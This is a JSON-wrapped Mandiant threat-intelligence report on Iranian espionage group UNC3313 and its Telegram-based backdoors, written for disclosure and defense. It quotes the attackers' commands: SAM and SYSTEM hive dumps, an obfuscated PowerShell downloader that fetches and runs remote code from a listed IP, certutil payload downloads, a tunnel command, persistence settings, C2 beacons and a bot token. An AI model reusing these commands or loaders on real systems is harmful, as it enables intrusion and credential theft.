{
    "id": "ea81aec8-d038-4c7b-9fae-4141b7943ede",
    "created_at": "2023-01-12T15:06:56.526927Z",
    "updated_at": "2025-03-27T02:16:14.02774Z",
    "deleted_at": null,
    "sha1_hash": "e3151e3b42393c6665d7ca3731402c598c305e2b",
    "title": "2022-02-24 - Left On Read- Telegram Malware Spotted in Latest Iranian Cyber Espionage Activity",
    "authors": "",
    "file_creation_date": "2022-05-28T23:43:39Z",
    "file_modification_date": "2022-05-28T23:43:39Z",
    "file_size": 1504593,
    "plain_text": "# Left On Read: Telegram Malware Spotted in Latest Iranian Cyber Espionage Activity\n\n**mandiant.com/resources/telegram-malware-iranian-espionage**\n\n[In November 2021, Mandiant Managed Defense detected and responded to an UNC3313 intrusion at a](https://www.mandiant.com/advantage/managed-defense)\nMiddle East government customer. During the investigation, Mandiant identified new targeted malware,\n[GRAMDOOR and](https://advantage.mandiant.com/malware/malware--94628aa2-e2b5-59bb-99b0-d28af5fad730) [STARWHALE, which implement simple backdoor functionalities. We also identified](https://advantage.mandiant.com/malware/malware--c6751f32-4818-585c-b233-d7b579d0fbbb)\nUNC3313 use publicly available remote access software to maintain access to the environment. UNC3313\ninitially gained access to this organization through a targeted phishing email and leveraged modified, opensource offensive security tools to identify accessible systems and move laterally. UNC3313 moved rapidly to\nestablish remote access by using ScreenConnect to infiltrate systems within an hour of initial compromise.\nThrough the rapid coordination of Mandiant Managed Defense and our customer’s security team, the\nincident was quickly contained and remediated.\n\nMandiant assesses with moderate confidence that UNC3313 conducts surveillance and collects strategic\ninformation to support Iranian interests and decision-making. Targeting patterns and related lures\ndemonstrate a strong focus on targets with a geopolitical nexus.\n\nThis blog post covers the details of an intrusion conducted by UNC3313, along with malware and publicly\navailable tools that were identified during our investigation.\n\n## Attribution\n\nMandiant uses the label “UNC” groups—or “uncategorized” groups—to refer to a cluster of intrusion activity\nthat includes observable artifacts such as adversary infrastructure, tools, and tradecraft that we are not yet\nready to give a classification such as TEMP, APT, or FIN (learn more about how Mandiant tracks\nuncategorized threat actors). Mandiant assesses with moderate confidence that UNC3313 is associated with\n[TEMP.Zagros (reported in open sources as MuddyWater), an Iran-nexus threat actor active since at least](https://www.mandiant.com/resources/iranian-threat-group-updates-ttps-in-spear-phishing-campaign)\n\n\n-----\n\nMay 2017, based on currently available information. TEMP.Zagros has consistently updated their toolkit over\n[the years, using malware such as POWERSTATS,](https://www.mandiant.com/resources/iranian-threat-group-updates-ttps-in-spear-phishing-campaign) [POWGOOP, and](https://advantage.mandiant.com/malware/malware--7b85e5ba-1be1-59ec-908c-7d426e03ffe3) [MORIAGENT in spear-phishing](https://advantage.mandiant.com/malware/malware--d0b485c2-31aa-5f8e-a36d-8bd63796d61c)\n[operations. The group’s use of ScreenConnect for initial compromise is well documented in open sources.](https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html)\n\n[Notably, on January 12, 2022, the U.S. government publicly stated it considers TEMP.Zagros as subordinate](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/)\nto the Iranian Ministry of Intelligence and Security (MOIS) and disclosed samples of malware families\n(POWGOOP and MORIAGENT) in use by the group since at least 2020.\n\n## Targeting\n\nIn the second half of 2021, Mandiant identified an UNC3313 campaign using GRAMDOOR and\nSTARWHALE to target Middle Eastern government and technology entities. TEMP.Zagros has historically\ntargeted these regions and sectors throughout the Middle East and Central and South Asia, including\ngovernment, defense, telecommunications, energy, and finance. Targeting patterns and related lures\ndemonstrate a strong focus on targets with a geopolitical nexus and the telecommunications sector in the\nMiddle East.\n\n## Malware Observed\n\nMandiant observed UNC3313 deploy the following malware families.\n\nTable 1: UNC3313 Malware Families\n\n**Malware Family** **Description**\n\n[GRAMDOOR](https://advantage.mandiant.com/malware/malware--94628aa2-e2b5-59bb-99b0-d28af5fad730) GRAMDOOR is a backdoor written in Python that uses the Telegram Bot API to\ncommunicate over HTTP with the Telegram server. Supported commands include\ncommand execution via cmd.exe.\n\n[STARWHALE](https://advantage.mandiant.com/malware/malware--c6751f32-4818-585c-b233-d7b579d0fbbb) STARWHALE is a Windows Script File (WSF) backdoor that communicates via\nHTTP. Supported commands include shell command execution and system\ninformation collection.\n\n[STARWHALE.GO](https://advantage.mandiant.com/malware/malware--ff190348-1d52-5177-a766-103ac395cee6) STARWHALE.GO is a backdoor written in GO programming language that\ncommunicates via HTTP. The backdoor can execute shell commands and collect\nsystem information, such as local IP address, computer name, and username.\n\nCRACKMAPEXEC CRACKMAPEXEC is a post-exploitation tool that helps automate assessing the\nsecurity of large Active Directory networks.\n\n## Outlook and Implications\n\nThe use of the Telegram API for command and control allows for malicious traffic to blend in with legitimate\nuser behavior. Combined with the use of legitimate remote access software, publicly available tools such as\nLIGOLO and CrackMapExec, and the multi-layer encoding routine, Mandiant believes this reflects\nTEMP.Zagros' efforts to evade detection and security features. Meanwhile, it is unclear how the U.S.\ngovernment's recent public attribution of \"MuddyWater\" to the Iranian Ministry of Intelligence and Security will\naffect the group's operations. It is plausible the group may re-tool and shift their tactics, techniques, and\nprocedures prior to conducting additional operations.\n\n\n-----\n\n## UNC3313 Attack Lifecycle\n\n### Establish Foothold\n\nUNC3313 initially gained access to the customer’s environment through a spear-phishing attack that\ncompromised multiple systems. Phishing emails were crafted with a job promotion lure and tricked multiple\nvictims to click a URL to download a RAR archive file hosted at the cloud storage service OneHub. This\n[pattern is consistent with observations in open-source reporting by Anomali and](https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies) [Trend Micro.](https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html)\n\nThe RAR archives contained a Windows Installer .msi file that installed ScreenConnect remote access\nsoftware to establish a foothold. Figure 1 shows a Windows Installer transaction event recorded in the\nWindows Application logs for the execution of performance.msi.\n\nFigure 1: Windows Installer transaction event for performance.msi\n\nLog: Application\n\nSource: MsiInstaller\n\nEID: 1040\n\nMessage: Beginning a Windows Installer transaction: C:\\Users\\\n<redacted>\\AppData\\Local\\Temp\\Rar$EXb7468.17680\\performance.msi-++-748-++-(NULL)-++-(NULL)++-(NULL)-++-(NULL)-++--++-. Client Process Id: 0.\n\nAs mentioned, UNC3313 moved rapidly to establish remote access through ScreenConnect to infiltrate\nsystems within an hour of initial compromise. ScreenConnect provides the capability to issue single CLI\n[commands to the client or to open a full terminal using Backstage Mode. Mandiant observed command](https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode)\nexecution using cmd.exe and powershell.exe by the parent process ScreenConnect.ClientService.exe.\n\nFigure 2: ScreenConnect client connection and command execution event logs\n\nLog: Application\n\nSource: ScreenConnect Client (f494f7a48b0cd497)\n\nEID: 0\n\nMessage: Cloud Account Administrator Connected-++\nLog: Application\n\nSource: ScreenConnect Client (f494f7a48b0cd497)\n\nEID: 0\n\nMessage: Cloud Account Administrator Disconnected-++\nLog: Application\n\nSource: ScreenConnect Client (f494f7a48b0cd497)\n\nEID: 0\n\nMessage: Executed command of length: 13-++\n\n-----\n\nWhen actively running, the ScreenConnect.ClientService.exe process performed DNS lookups for a\nScreenConnect relay service at instance-<6 character alphanumeric id>-relay.screenconnect.com. Mandiant\nobserved the process ScreenConnect.WindowsClient.exe write additional attacker tools to the initially\ncompromised hosts, indicating the files were copied through the active ScreenConnect session.\n\nFigure 3: File write event by the ScreenConnect Windows Client process\n\nFile Write Event\n\nFull Path: C:\\ProgramData\\ligo64.exe\n\nSize: 3474432\n\nMD5: 7fefce7f2e4088ce396fd146a7951871\n\nProcess: ScreenConnect.WindowsClient.exe\n\nProcess Path: C:\\Program Files (x86)\\ScreenConnect Client (f494f7a48b0cd497)\n\nParent Process Path: C:\\Program Files (x86)\\ScreenConnect Client\n(f494f7a48b0cd497)\\ScreenConnect.ClientService.exe\n\n### Escalate Privileges\n\nMandiant observed UNC3313 use common credential-dumping techniques using legitimate Windows\n[utilities. UNC3313 leveraged the open-source WMIEXEC.PY attack framework to execute reg commands to](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)\nexport copies of the local SAM, SYSTEM, and SECURITY Windows registry hives. WMIEXEC.PY enables\nsimple command invocation on a remote system (with admin rights and DCOM ports accessible on target\nsystem) via WMI (Windows Management Instrumentation).\n\nFigure 4: Suspicious Registry exports executed by WMIEXEC.PY\n\ncmd.exe /Q /c reg save HKLM\\SAM C:\\users\\public\\sam 1> \\\\127.0.0.1\\ADMIN$\\__1637143994.2306612\n2>&1\n\ncmd.exe /Q /c reg save HKLM\\SYSTEM C:\\users\\public\\system 1>\n\\\\127.0.0.1\\ADMIN$\\__1637143994.2306612 2>&1\n\ncmd.exe /Q /c reg save HKLM\\SECURITY C:\\users\\public\\security 1>\n\\\\127.0.0.1\\ADMIN$\\__1637143994.2306612 2>&1\n\nUNC3313 used the Task Manager application to dump the process memory of lsass.exe, as shown in Figure\n5 when the process Taskmgr.exe wrote the file lsass.dmp.\n\nFigure 5: Task Manager Dump of LSASS.EXE\n\n\n-----\n\nFile Write Event\n\nFull Path: C:\\Users\\<redacted>\\AppData\\Local\\Temp\\2\\lsass.DMP\n\nSize: 59378917\n\nProcess: Taskmgr.exe\n\nProcess Path: C:\\Windows\\System32\n\nParent Process Path: C:\\Windows\\explorer.exe\n\n### Internal Reconnaissance and Lateral Movement\n\nMandiant observed UNC3313 leverage publicly available offensive security tools to accomplish remote\ncommand execution, internal reconnaissance, network tunneling, and lateral movement. UNC3313 used a\nslightly modified version of the open-source pen-testing tool CrackMapExec v3.0 (CRACKMAPEXEC)\ncompiled with Pyinstaller to perform system enumeration and user account reconnaissance and to execute\nremote commands on target systems. The modified version of CRACKMAPEXEC used by the attacker,\nnamed aa.exe, had the tool’s description removed and included the database setup code from the utility\nsetup_database.py to bypass extra installation steps (Figure 6).\n\nFigure 6: Modified\n\nCRACKMAPEXEC with inclusion of setup_database.py code\nUNC3313 performed initial reconnaissance and account access testing with CRACKMAPEXEC using the\ncommands shown in Figure 7 and Figure 8. The credential and host information collected by\nCRACKMAPEXEC were stored in the local database file cme.db.\n\nFigure 7: Initial execution of compiled CRACKMAPEXEC\n\naa.exe 10.20.11.1/24\n\nFigure 8: Local Administrator access testing with CRACKMAPEXEC\n\naa.exe 10.20.11.1/24 -u <local admin> -p <password> --local-auth\n\nUNC3313 used CRACKMAPEXEC to run the Windows utility certutil and obfuscated PowerShell commands\nto download additional tools and payloads on remote systems.\n\nFigure 9: Execution of obfuscated PowerShell downloader\n\n\n-----\n\naa.exe 10.20.11.11 -u <local admin> -p <password> --local-auth -x \"powershell -exec bypass\n\n\"function decode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);for($i=0; $i\n\n-lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt =\n\n[System.Text.Encoding]::UTF8.GetString($enByte);return $dtxt;};IEX (decode\n\n'J3QjPiNYUHpwd2ZuLU1mdy1Ld3dzVGZhUWZydmZwd145OUBxZmJ3Ziska3d3czksLDc2LTI3M\n\nS0xMjEtNTI5OzMsZGZGcVNrdzVgWWgwZXJkMzNlS0xtaWA6SDJbW2FvQVskKjgndC1zcWx7ei\n\nM+I1hNZnctVGZhUWZydmZwd145OURmd1B6cHdmblRmYVNxbHt6Kyo4J0Z7ZmB2d2psbUBs\n\nbXdme3ctSm11bGhmQGxubmJtZy1KbXVsaGZQYHFqc3crK01mdC5MYWlmYHcjUHpwd2ZuLU\npMLVB3cWZiblFmYmdmcSsndC1EZndRZnBzbG1wZisqLURmd1FmcHNsbXBmUHdxZmJuKyoqK\n\ni1RZmJnV2xGbWcrKio4' 3);\"\n\nThe obfuscated PowerShell downloader used base64 encoding and simple XOR encryption that decoded to\nthe general command syntax shown in Figure 10.\n\nFigure 10: Deobfuscated PowerShell command\n\n$w = [System.Net.HttpWebRequest]::Create('http[:]//\n45.142.212[.]61:80/geErPht6cZk3fqg00fHOnjc9K1XXblBX');\n\n$w.proxy = [Net.WebRequest]::GetSystemWebProxy();\n\n$ExecutionContext.InvokeCommand.InvokeScript((New-Object\nSystem.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd());\n\n[UNC3313 used the multi-platform LIGOLO tunneler utility to establish tunneled access into our customer’s](https://github.com/sysdream/ligolo)\nenvironment. LIGOLO is an open-source, encrypted reverse SOCKS5 or TCP tunneler written in GO. The\nLIGOLO utility was executed with the command-line argument “-s3” to specify the relay server instead of the\ndocumented argument “-relayserver”, which indicates modification of the original code downloaded from the\nGitHub repository.\n\nFigure 11: Remote execution of certutil to download LIGOLO tunneler via CRACKMAPEXEC\n\naa.exe 10.20.11.11 -u <local admin> -p <password> --local-auth -x \"certutil.exe -urlcache -split -f\nhttp[:]//95.181.161[.]81:443/l.exe C:\\programdata\\l.exe\"\n\nFigure 12: Execution of LIGOLO tunneler utility with relay server\n\nc:\\programdata\\ligo64.exe -s3 95.181.161[.]81:5555\n\nMandiant observed the hostname DESKTOP-5EN5P2I in Windows logon events on systems that were\naccessed by UNC3313 through an RDP connection tunneled using LIGOLO.\n\nFigure 13: Windows logon events showing evidence of RDP session tunneling via LIGOLO\n\n\n-----\n\nLog: Security\n\nEID: 4624\n\nNetwork Information:\n\nWorkstation Name:   DESKTOP-5EN5P2I\n\nSource Network Address:   \nSource Port:         \nLog: Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational\n\nEID: 1149\n\nUser: <local admin>\n\nDomain: DESKTOP-5EN5P2I\n\nSource Network Address: 10.20.11.14\n\n### Maintain Persistence\n\nMandiant identified a new malware family named STARWHALE that was used by UNC3313. STARWHALE is\na Windows Script File backdoor that simply receives commands from a command and control (C2) server via\nHTTP and executes those commands via Windows cmd.exe. On the infected system, STARWHALE was\nobserved being executed with a command-line argument as shown in Figure 14.\n\nFigure 14: STARWHALE execution\n\ncmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback__whale\n\nFigure 15:\n\nSTARWHALE Code Snippet\nThe command line argument \"humpback__whale \" is used in the code to dynamically resolve functions at\nruntime using the VBScript function GetRef. Since STARWHALE does not contain any persistence\nmechanism, a service is created as shown in Figure 16.\n\nFigure 16: STARWHALE Persistence Method\n\nsc create Windowscarpstss binpath= \"cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf\nhumpback__whale\" start= \"auto\" obj= \"LocalSystem\"\n\n\n-----\n\nSTARWHALE communicates with its C2 server, which is hardcoded in the malware. Upon first execution, the\nmalware gathers basic user and system information, such as local IP address, computer name, and\nusername. It then encodes this information using a custom encoding scheme before sending the information\nto the C2 IP address as shown in Figure 17.\n\nFigure 17: STARWHALE Beacon\n\nPOST /jznkmustntblvmdvgcwbvqb HTTP/1.1\n\nConnection: Keep-Alive\n\nContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\nAccept: */*\n\nAccept-Language: en-us\n\nUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\nCharSet: UTF-8\n\nContent-Length: 69\n\nHost: 5.199.133[.]149\n\nvl=27732737231435E335F4239537109C22531327535C22D1327235E46253E2215613\n\nThe hex value passed via the POST request parameter “vl=”, as shown in Figure 17, can be decoded to the\nfollowing system enumeration information, piped together and separated with a delimiter:\n\n<ip address>|delimiter|<hostname>\\\\<username\n\nThe delimiter in the samples observed was “|!)!)!|”. It then expects its C2 server to return a string value that is\nencoded using the same scheme. This string value is then included in all subsequent POST requests.\nIf STARWHALE’s initial request is successful, it begins sending the session key in a loop via HTTP\nPOST requests to its C2 server at hxxp://5.199.133[.]149/oeajgyxyxclqmfqayv. The C2 server will then\nrespond with a command meant to be executed via cmd.exe, as shown in Figure 18.\n\nFigure 18: STARWHALE command execution process\n\ncmd.exe /c <command> >> %temp%\\stari.txt.\n\nThe output of the command is written to a file called “stari.txt.” It then encodes the output using the custom\nscheme and sends it back to the C2 server in its next POST request. The structure is similar to what is\nshown in Figure 19.\n\nFigure 19: STARWHALE information sent to C2\n\n<c2_session_key>|!)!)!|<command_output>\n\nIf the command fails, it sends the encoded string \"SoRRy\" to its C2. Notably, in earlier iterations of\nSTARWHALE, Mandiant also observed it using the string \"sory\" [sic]. The threat actor corrected the spelling\nerror after security researchers highlighted the string in a public forum. Mandiant has observed similar\nspelling errors in other campaigns by Iranian threat actors.\n\n\n-----\n\nDuring the intrusion, Mandiant also observed the actors deploying a malware that shares a lot of similarities\nwith STARWHALE in design but written in Golang. Mandiant is calling this code family STARWHALE.GO. It\nis downloaded on the system using the certuil.exe utility as shown in Figure 20.\n\nFigure 20: STARWHALE.GO download\n\ncertutil.exe -urlcache -split -f hxxp://95.181.161[.]81:443/per_indexx.exe\n\nSTARWHALE.GO arrives as part of a Nullsoft Scriptable Install System (NSIS) installer, which installs it in a\ndirectory called OutlookM and creates a Run key in Windows registry to make it persistent on the system.\nUpon execution, it drops the Golang binary and executes it.\n\nFigure 21: NSIS Script Snippet for STARWHALE.GO\n\nInstType $(LSTR_37)  ; Custom\n\nInstallDir $LOCALAPPDATA\\OutlookM\n\n; install_directory_auto_append = OutlookM\n\n; wininit = $WINDIR\\wininit.ini\n\n; -------------------\n; SECTIONS: 1\n\n; COMMANDS: 6\n\nSection ; Section_0\n\n; AddSize 4744\n\nCreateDirectory $INSTDIR\n\nSetOutPath $INSTDIR\n\nFile index.exe\n\nExec $INSTDIR\\index.exe\n\nWriteRegStr HKCU SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run OutlookM $INSTDIR\\index.exe\n\nSectionEnd\n\nThe following registry key is created as a result of running the NSIS executable.\n\nFigure 22: STARWHALE.GO Persistence Method\n\nKEY: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookM\n\nValue: C:\\Users\\<redacted>\\AppData\\Local\\OutlookM\\index.exe\n\nSTARWHALE.GO also uses a custom data encoding algorithm to protect its network communication and\ncritical strings within the binary. It sends the same information as STARWHALE, but the data sent and\nreceived are a JSON object. A sample HTTP POST request is shown in Figure 23.\n\nFigure 23: STARWHALE.GO HTTP C2 beacon\n\n\n-----\n\nPOST /nnskfepmasiiohvijcdpxtxzjv HTTP/1.1\n\nHost: 87.236.212[.]184\n\nUser-Agent: Go-http-client/1.1\n\nContent-Length: 91\n\nContent-Type: application/json\n\nAccept-Encoding: gzip\n\n{\"vl\":\"2179526e3176587ec7557e4192495c46264556569c47693e8d39415432445722222733323323332333\"}\n\nSTARWHALE.GO uses a different delimiter “|&&%&&|” than STARWHALE, but the rest of the enumerated\ninformation sent to the hardcoded C2 IP address is the same. Similarly, the malware reads the response\nfrom the POST request to the C2 server and attempts to decode it using the same custom string\ntransformation routine it used to encode the data it sent. This routine is simpler than that used by\nSTARWHALE, as explained later. The decoded result is either launched as a command line with the\nprocess \"cmd.exe /c\" or launched directly as a process if the string ends with .com, .exe, .bat, or .cmd. The\noutput of the launched process, or error message in the case of a failure to decode the string, is sent to the\nC2 server via HTTP POST requests to its C2 server at hxxp://87.236.212[.]184/cepopggawztuxkxujfjbnpv.\n\nMandiant identified a third UNC3313 backdoor during the investigation that was compiled with Python 3.9\nand packaged via PyInstaller, which would only execute on Windows 8 and higher. Mandiant has named this\nbackdoor GRAMDOOR due to its ability to use the Telegram Bot API for communication. It sends and\nreceives messages from an actor-created Telegram chat room. GRAMDOOR arrives on the system\npackaged as an NSIS installer, which establishes a persistence mechanism by setting the Windows Run\nregistry key, as shown in Figure 24.\n\nFigure 24: GRAMDOOR Persistence Method\n\nKEY: HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift\n\nValue: C:\\Users\\<redacted>\\AppData\\Roaming\\OutlookMicrosift\\index.exe\" Platypus\n\nThe NSIS installer for GRAMDOOR drops the PyInstaller packaged binary in the APPDATA directory in a\nsubdirectory named OutlookMicrosift. It is executed using Exec command from the install directory, as shown\nin Figure 25.\n\nFigure 25: NSIS Script Snippet for GRAMDOOR\n\n\n-----\n\nInstType $(LSTR_37)  ; Custom\n\nInstallDir $APPDATA\\OutlookMicrosift\n\n; install_directory_auto_append = OutlookMicrosift\n\n; wininit = $WINDIR\\wininit.ini\n\n; -------------------\n; SECTIONS: 1\n\n; COMMANDS: 6\n\nSection ; Section_0\n\n; AddSize 16859\n\nCreateDirectory $INSTDIR\n\nSetOutPath $INSTDIR\n\nFile index.exe\n\nExec \"$INSTDIR\\index.exe Platypus\"\n\nWriteRegStr HKCU SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run OutlookMicrosift\n\"$\\\"$INSTDIR\\index.exe$\\\" Platypus\"\n\nSectionEnd\n\nGRAMDOOR expects to be launched with one command-line parameter, which in this case was \"Platypus.\"\nIt uses this command-line parameter to piece together the function name, which is then called and acts as\nthe entry point to the malware. GRAMDOOR implements only two commands: start and com. These\ncommands are used to launch a cmd.exe process to which commands are piped. All network communication\nis via the Telegram server at api.telegram[.]org. This allows the actors to disguise their communication as\n[regular Telegram traffic. This technique is not novel, and it is not the first time Iranian actors abused publicly](https://securityintelligence.com/posts/nation-state-threat-group-targets-airline-aclip-backdoor/)\navailable software to make their C2 traffic blend in.\n\nAll HTTP requests from the malware to the Telegram server contained the token string\n2003026094:AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXrY. The token strings are used to authenticate to the\nbot. Figure 26 shows a sample request.\n\nFigure 26: GRAMDOOR Sample Request\n\nhxxps://api.telegram[.]org/bot2003026094:AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXrY/sendMessage?\nchat_id=<chat_id>&parse_mode=Markdown&text=<content>\n\nThe malware uses the sendMessage API function to send information to a chat ID number. The actors\ninteract with the host via the chat by issuing commands and then getting output of the executed commands\nsent back in the chat. For example, to retrieve network configuration information from the infected host, the\nattacker would issue the command “com<id> c607666261766066f9f23ec696” where the value\n“c607666261766066f9f23ec696” is translated to “ipconfig /all” command.\n\n\n-----\n\nSTARWHALE and GRAMDOOR share similarities in logic for the custom encoding scheme used for the data\nand commands sent to and received from the C2. The following code snippet demonstrates STARWHALE’s\ntraffic encoding and decoding and GRAMDOOR’s commands passed back and forth between Telegram chat\nmessages.\n\nFigure 27: Encoding/Decoding custom routine example code snippet\n\ndef transform_chars(data):\n\ndata = list(data)\n\nsrc = 0\n\ndst = len(data) - 1\n\nwhile src < dst:\n\nt = data[src]\n\ndata[src] = data[dst]\n\ndata[dst] = t\n\nsrc += 3\n\ndst -= 2\n\nreturn ''.join(data)\n\ndef decode_traffic(data):\n\nreturn bytes.fromhex(transform_chars(transform_chars(data)[::-1])).decode('utf')\n\ndef encode_traffic(data):\n\nreturn transform_chars(transform_chars(data.encode('utf').hex())[::-1])\n\nGRAMDOOR also hides sensitive strings within its code using a custom XOR-based encryption scheme.\nThe following sample code shows the logic of the aforementioned scheme.\n\nFigure 28: Sample snippet showing XOR-based encryption scheme used in GRAMDOOR\n\ndef xor_transform(data):\n\nkey = '`qLd' + str(5) + 'Hm^yw/sG-qh&@~y|[dJmC' + str(6) + 'UFvNt-^^_FeSd' + str(4) + 'N*#GNophwQMCJ' + str(1) + '?>L73PY'\n\nreturn ''.join((lambda .0: [ chr(ord(c1) ^ ord(c2)) for c1, c2 in .0 ])(zip(data, key)))\n\ndef encode_str(data):\n\nreturn base64.b64encode(xor_transform(data).encode())\n\ndef decode_str(data):\n\nreturn xor_transform(base64.b64decode(data).decode())\n\n\n-----\n\nMandiant also observed UNC3313 store PowerShell downloader commands in Registry keys that were\nreferenced by a Scheduled Task named “Oracle scheduled assistant Autoupdate” that is triggered on user\nlogon.\n\nFigure 29: PowerShell command stored in Registry Value “Pre”\n\nPath: HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Oracle\\Pre\n\nType: REG_SZ\n\nValue Name: Pre\n\nText: IEX\n\nFigure 30: PowerShell command stored in Registry Value “Post”\n\nPath: HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Oracle\\Post\n\nType: REG_SZ\n\nValue Name: Post\n\nText: function decode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);\n\nfor($i=0; $i -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt =\n\n[System.Text.Encoding]::UTF8.GetString($enByte);return $dtxt;}while($true){try{$o=\n\n[System.Net.HttpWebRequest]::Create('http[:]//87.236.212[.]6:80/esZ8389bp2LFqRLI');\n\n$o.proxy =\n\n[Net.WebRequest]::GetSystemWebProxy();$ExecutionContext.InvokeCommand.InvokeScript((decode\n(New-Object System.IO.StreamReader($o.GetResponse().GetResponseStream())).ReadToEnd()\n3));}catch{}Start-Sleep -Seconds 40;}\n\nLastly, Mandiant observed UNC3313 download and execute a Windows Installer file for the eHorus remote\naccess tool from the vendor website. UNC3313 executed the file ehorus_installer_windows-1.1.3-x64_enUS.msi, which created a service named EHORUSAGENT. The eHorus agent process ehorus_agent.exe\ncommunicates with domains hosted on ehorus[.]com.\n\nFigure 31: Service installation for eHorus agent\n\nLog: System\n\nSource: Service Control Manager\n\nEID: 7045\n\nService Name: eHorus Agent Launcher\n\nService File Name: &amp;quot;C:\\Program Files\\ehorus_agent\\ehorus_launcher.exe&amp;quot; -s\n\n[eHorus is a legitimate remote access tool advertised commercially by Pandora FMS, which is based in](https://pandorafms.com/en/)\n[Spain. eHorus has been recently reported by Symantec being abused by Iranian threat actors in a similar](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-telecoms-asia-middle-east)\ncampaign against telecom organizations in Middle East and Asia.\n\n### Mandiant Targeted Attack Lifecycle\n\n[Learn more about the Mandiant Targeted Attack Lifecycle](https://www.mandiant.com/resources/targeted-attack-lifecycle)\n\n\n-----\n\nFigure 32: Mandiant\n\n\nTargeted Attack Lifecycle\n\n## MITRE ATT&CK Techniques\n\n**ATT&CK Tactic Category** **Techniques**\n\nResource Development [Obtain Capabilities (T1588)](https://attack.mitre.org/techniques/T1588/)\n\n[Tool (T1588.002)](https://attack.mitre.org/techniques/T1588/002/)\n\n[Develop Capabilities (T1587)](https://attack.mitre.org/techniques/T1587/)\n\n[Malware (T1587.001)](https://attack.mitre.org/techniques/T1587/001/)\n\nInitial Access [Phishing (T1566)](https://attack.mitre.org/techniques/T1566/)\n\n[Phishing: Spearphishing Link (T1566.002)](https://attack.mitre.org/techniques/T1566/002/)\n\nExecution [Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053)\n\n[Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005)\n\n[Command and Scripting Interpreter (T1059)](https://attack.mitre.org/techniques/T1059)\n\n[PowerShell (T1059.001)](https://attack.mitre.org/techniques/T1059/001)\n[Windows Command Shell (T1059.003)](https://attack.mitre.org/techniques/T1059/003)\n\n[System Services (T1569)](https://attack.mitre.org/techniques/T1569)\n\n[Service Execution (T1569.002)](https://attack.mitre.org/techniques/T1569/002)\n\n[Windows Management Instrumentation (T1047)](https://attack.mitre.org/techniques/T1047)\n\n[Boot or Logon Autostart Execution (T1547)](https://attack.mitre.org/techniques/T1547/)\n\n[Registry Run Keys / Startup Folder (T1547.001)](https://attack.mitre.org/techniques/T1547/001/)\n\n[User Execution (T1204)](https://attack.mitre.org/techniques/T1204/)\n\n[Malicious File (T1204.002)](https://attack.mitre.org/techniques/T1204/002/)\n\n\n-----\n\nPersistence [Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053)\n\n[Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005)\n\n[Create or Modify System Process (T1543)](https://attack.mitre.org/techniques/T1543)\n\n[Windows Service (T1543.003)](https://attack.mitre.org/techniques/T1543/003)\n\n[Boot or Logon Autostart Execution (T1547)](https://attack.mitre.org/techniques/T1547)\n\n[Registry Run Keys / Startup Folder (T1547.001)](https://attack.mitre.org/techniques/T1547/001)\n\nPrivilege Escalation [Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053)\n\n[Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005)\n\nDefense Evasion\n\nCredential Access [OS Credential Dumping (T1003)](https://attack.mitre.org/techniques/T1003)\n\n[LSASS Memory (T1003.001)](https://attack.mitre.org/techniques/T1003/001)\n[Security Account Manager (T1003.002)](https://attack.mitre.org/techniques/T1003/002/)\n\n[Brute Force](https://attack.mitre.org/techniques/T1110/)\n\n[Brute Force: Password Guessing (T1110.001)](https://attack.mitre.org/techniques/T1110/001/)\n\nDiscovery [Remote System Discovery (T1018)](https://attack.mitre.org/techniques/T1018)\n\n[System Owner/User Discovery (T1033)](https://attack.mitre.org/techniques/T1033)\n\n[Network Service Scanning (T1046)](https://attack.mitre.org/techniques/T1046)\n\nLateral Movement [Remote Services (T1021)](https://attack.mitre.org/techniques/T1021)\n\n[Remote Desktop Protocol (T1021.001)](https://attack.mitre.org/techniques/T1021/001)\n\nCollection [Archive Collected Data (T1560)](https://attack.mitre.org/techniques/T1560)\n\n[Archive via Utility (T1560.001)](https://attack.mitre.org/techniques/T1560/001)\n\nCommand and Control [Ingress Tool Transfer (T1105)](https://attack.mitre.org/techniques/T1105)\n\n[Remote Access Software (T1219)](https://attack.mitre.org/techniques/T1219/)\n\n[Application Layer Protocol (T1071)](https://attack.mitre.org/techniques/T1071)\n\n[Web Protocols (T1071.001)](https://attack.mitre.org/techniques/T1071/001)\n\n[Protocol Tunneling (T1572)](https://attack.mitre.org/techniques/T1572)\n\n[Web Service (T1102)](https://attack.mitre.org/techniques/T1102/)\n\n[Bidirectional Communication (T1102.002)](https://attack.mitre.org/techniques/T1102/002/)\n\n\n-----\n\n## Mandiant Security Validation 